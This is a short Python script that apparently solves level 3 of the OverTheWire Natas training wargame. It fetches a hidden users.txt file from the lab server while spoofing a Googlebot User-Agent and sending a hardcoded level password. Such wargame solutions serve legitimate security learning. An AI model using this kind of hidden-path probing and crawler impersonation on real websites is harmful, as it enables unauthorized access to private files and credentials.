#!/usr/bin/env python

import requests
NATAS="natas3"

headers = { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}

r = requests.get("http://" + NATAS + ".natas.labs.overthewire.org/s3cr3t/users.txt" , auth=(NATAS, 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14') , headers=headers)

print(r.status_code)
print(r.text)
#print("Encording: " + r.encoding + "HTTP Code: " + "Headers: " + r.headers)
print(r.headers)

